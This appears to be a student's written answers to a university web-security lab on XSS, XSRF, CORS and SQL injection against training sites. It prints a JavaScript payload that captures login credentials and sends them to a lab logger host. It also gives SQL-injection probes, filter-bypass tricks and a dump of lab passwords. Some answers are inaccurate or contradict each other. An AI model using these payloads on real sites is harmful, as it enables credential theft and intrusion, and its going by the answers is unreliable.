## 3.1
**What is the same origin policy? How does the reflected XSS attack bypass this policy?**

*Same origin policy* is a rule that only lets script access data belonging to the same origin. In this case *same orgin policy* is bypassed due to the victims naivety to click on any link that is sent to them. The code is ran on the victims browser which when sends cookie to the logger.

**A web application vulnerable to reflected XSS will send the received unfiltered input back to the user (e. g., in a search result page). How can you test for a page’s susceptibility to reflected XSS based on this behavior? 
(Hint: Sending the string via an input field might not suffice. Look at the source code of the returned page and check how and where exactly your input script is reflected.)**

Test if you can escape any inputs by using `<` or `"` and see if any inputs ends up in the inspected html

**Which is the vulnerable input element on the Zoobar website?**

The user search field since the research is reflected url and any input there can be injected into the source code

**How can you use the log script to send data to the logger? Provide an example in the JavaScript language.**
```javascript
void((new Image()).src='http://dasak-vm-lab-server.eecs.kth.se/logger/log.php?' + 'to=' + '&payload=' + '&random=' + Math.random());
```

**Which HTML DOM object has a cookie property?**

```javascript
document.cookie;
```
**the victim is not supposed to see any error messages. What does the following script do?
document.getElementById("x").style.display = ...;**

It hides the the element x which we injected
## 3.2 
**How can XSRF work? Describe the browser behavior and problems with session management that make the attack possible**

Because we never check if the request originates from its own page. As long as the session is valid i.e valid cookie any request regardless of origin is accepted

**Look at the source code and the HTTP headers during the transfer of Zoobars. Your crafted request should look exactly like a real transfer. What information (input) is being sent? Which type of request should you craft, GET or POST?**

We forge a request that mirrors the HTML form used by the site. The site uses request uses POST.

**Normally, HTML forms are sent when users manually click a Submit button, but here we cannot rely on the victim to do that. How can you submit a form using JavaScript? Give a simple example.**

As soon as the document is filled in my our desired inputs we can ust call submit in this case:

```javascript
document.getElementById("f").submit()
```
## 3.3 
**Describe how to prevent XSS flaws in a web application.**
Making sure that any input that the user does cannot become running code. For example through input sanitation and make escaping harder.

**What can be done by a user to protect themselves against XSRF when browsing the web? Name at least two mitigations.**

1. Log out and close sensitive sites when done
2. Avoid opening suspicious links or random HTML files 

**How can you prevent XSRF vulnerabilities on the server-side?**

Use CSRF tokens when server sends a form to the user it includes a unpredictable token which will be used later for comparison

## 3.4
**What mistake did the Zoobar developers make that allows for reflected XSS on the login page, even though the input is being sanitized?**

The developers used a function called `htmlspecialchars()` in an attempt to sanitize user input that way injected tags such as `<script>` can by sanitized how ever we didn't need to inject tags you can add the script directly to value

**Even though this vulnerability allows injecting some payloads into the page, here a lot of characters cannot be used directly, since they would be sanitized or interpreted differently than an attacker would intend them to be. How can you get around this and run arbitrary JavaScript code despite these limitations?**

We cannot inject characters such as: `<`, `"`, `'` therefore we couldn't break out of a script tag or break using `"` therefore we put a script in the value field with onfocus
```javascript
onfocus = document.loginform.login_username.value = ``;
document.querySelector(`.warning`).style.display = `none`;
document.loginform.onsubmit = () => { // the logger code
    new(Image)().src = `http://dasak-vm-lab-server.eecs.kth.se/logger/log.php?to=yunshan&payload=` + document.loginform.login_username.value + `,` + document.loginform.login_password.value + `&random=` + Math.random();
    return !0;
};
history.replaceState({}, ``, `/`)
autofocus
```
## 3.5
**Briefly explain what Cross-Origin Resource Sharing (CORS) is and how the restrictions it imposes help secure against XSRF attacks.**

CORS controls javascripts on one origin can read reponses rom another origin. It blocks a malicious page from reading private data returned by cross orign requests

**What is the Zoobar application's CORS policy?**
It allows access origin from http://localhost:7700

## 4.2
**What can you infer about the attack attempted by the hacker that you are tracking? Briefly describe what it might be doing (without details, just the rough idea).**

It was a SQL injection

**What username did the hacker use for the attack and what was the logged IP address?**

* rwilson  
* 70.86.70.33

## 4.3

**Name 3 mechanisms that a website might use to transfer data from the browser to the server within an HTTP request (e.g., when submitting a form, or to remember that user is logged in).**
1. Cookies
2. Request body
3. URL

**As most web applications, Cloaknet performs database queries internally when loading its pages. Since content is contextual, these SQL queries take certain values as inputs, such as the username you type on the login page (user). Name two other values that you know Cloaknet uses as inputs in SQL queries.**

* Post: Password
* Get: Session Cookie

**How many SQL queries do you think are issued when you log in to the website? What inputs might these queries use? What do you think these SQL queries look like? Write them down as precisely as possible (e.g., using SQL syntax/pseudo-code).**
Maybe 1 query for checking if user exists in database since new users can't be added

```SQL
-- Authetnication check
SELECT * FROM users WHERE <username> = username AND password = <password>
```

**Check whether' the Cloaknet web application’s inputs are vulnerable to SQL injection. How can you do that? Give
two examples of possible checks.**

Try to cause sql errors by using `'` or something like `' OR 1=1` if that returns true you know that the webpage is vulnerable

**Why is it useful to know which database engine is used?**

In order to know how to formulate your SQL injections for that specfic engine

**When you try to inject a meaningful SQL string, a first obstacle you might encounter is that some characters are not accepted by the server in cookie values - in this case, whitespace. How can you get around this specific limitation in your injected query (i.e., perform SQL queries without spaces)?**

Use `/**/` instead of spaces

**All inputs are filtered! The filter escapes some characters and removes some words (e.g. SELECT). Name at least
four techniques to bypass filters in general (with examples).**

1. `SELECT` &longrightarrow; `selSELECTect`
2. `SELECT` &longrightarrow; `SeLeCT`
3. `SELECT` &longrightarrow; `CONCAT('S','E','L','E','C','T')`
4. `SELECT from users WHERE username = admin` &longrightarrow; `SELECT * FROM users WHERE username = 0x61646d696e`

**What was the source IP address for the attack we are tracking, coming from GGHB on the correct date?**
* 86.5.223.42 and yes the date matches

**Table and column names are very predictable in this lab. What could be the name of the table containing all usernames and passwords?**
This was the table:
blu, rosebud, 72133
thursday, hydrazine, 13134
demo, demo, 71934.

blue, thursday, demo are usernames 

**The UNION operator is used to combine output from several SELECT statements. What requirements should these statements meet in order to be “unioned”? What do you have to do if the tables you want to union do not have the same number of columns?**

You can pad them with columns and then union them 

**You should be able to infer the number of columns used in the query statement from the output you see on the page. Sometimes, though, not everything is shown, and then it is important to find out the number of columns. How can this be done? Provide an example.**

You do `ORDER BY i` and increases `i` until it crashes

**You can union tables even without specifying column names. How can you include all columns of a table in the UNION statement without explicitly naming them?**

Yes you assume it's possible to union columns and do `UNION SELECT * FROM USERS`

**What is the hacker’s username and password? How did you get the list of usernames and passwords? How did you know which one was the attacker?**

The hackers name is `thursday`and the password is `magazine` we get this by looking at their target and date

**Describe how parametrized queries help protect against SQL injection. What other protection techniques can be used on the application’s code level?**

Parameterized queries use placeholders such as `?` to define where data will go. User cannot inject into a such field. 

**What is a stored procedure? Describe how it protects against SQL injection. What other protection techniques can be used at the database level?**

Stored procedure are a set of queries that can be called if when it needs to be used it can force user input to be stored as data and not as executable SQL
